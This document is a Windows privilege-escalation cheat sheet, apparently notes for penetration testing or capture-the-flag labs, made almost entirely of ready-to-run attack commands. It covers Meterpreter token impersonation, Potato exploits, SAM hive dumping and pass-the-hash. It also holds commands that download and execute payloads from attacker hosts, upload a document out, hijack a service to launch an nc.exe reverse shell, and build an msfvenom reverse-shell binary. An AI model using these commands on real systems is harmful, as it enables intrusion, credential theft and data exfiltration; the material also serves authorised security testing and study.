## Meterpreter
### Enumerators
```
run post/multi/recon/local_exploit_suggester
```
### Get Powershell
```
load powershell
powershell_shell
```
### Port forward
```
portfw add -l 455 -p 455 -r 127.0.0.1
```
### Rotten Potato
```
load incognito
list_tokens -u
execute -cH -f rottenpotato.exe
impersonate_token BUILTIN\Administrators
```

## Windows Enum and Utilities
### Manual
```
whoami /all
net user
hostname
systeminfo
tasklist /SVC
ipconfig /all
route print
netstat -ano
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
schtasks /query /fo LIST /v
wmic product get name, version, vendor
wmic qfe get Caption, Description, HotFixID, InstalledOn
accesschk.exe -uws "Everyone" "C:\Program Files"
powershell -c "driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path"
powershell -c "Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like '*VMware*'}"
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
### Script
```
echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/PowerUp.ps1') | powershell -noprofile -
certutil -urlcache -split -f http://192.168.119.199/windows-privesc-check2.exe
```

### Check permission
```
Get-ACL administrator | Fl *
icacls "file"
```

### Change file permission
```
cacls root.txt /t /e /p Alfred:F
```

### Get sam
```
reg save hklm\sam c:\sam
reg save hklm\system c:\system
```

### With NTLM hash
```
pth-winexe -U jeeves/administrator //10.10.10.63 cmd.exe
```

### Juicy Potato
```
JuicyPotato.exe -l 7777 -p C:\Users\Public\hope.exe -t *
```

### smbserver.py
On attacker machine
```
sudo smbserver.py quang `pwd`
```

On victim machine
```
New-PSDrive -Name "yoyo" -PSProvider FileSystem -Root "\\10.10.14.3\quang"
cd yoyo:
```
### wget
```
certutil -urlcache -f http://123.123.123.123/file c:/user/administrator/file
```
or Create ps file with
```
$client = new-object System.Net.WebClient
$client.DownloadFile("http://10.10.14.3/shell.exe","C:\users\kohsuke\shell.exe")
```

### Upload
```
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.199/upload.php', 'important.docx')
```

## Common Vuln
### Weak service permission
How to spot
```
Use PowerUp script
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
sc qc servicename
```
Exploit
```
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config SSDPSRV start= auto
net start SSDPSRV
net start upnphost
```
### An user is admin
Exploit
#### Run as user
```
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.3/shell')" -Credential $cred
```

#### Run as NTAuth/System from local admin
```
PsExec.exe -accepteula -i -s %SystemRoot%\System32\cmd.exe
```

### Weak Service binary permission or unquoted service path
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f exe-service > shell.exe
```

### Local service
How to spot
```
netstat -ano
tasklist /svc
tasklist /v /fi "pid eq 123"
```
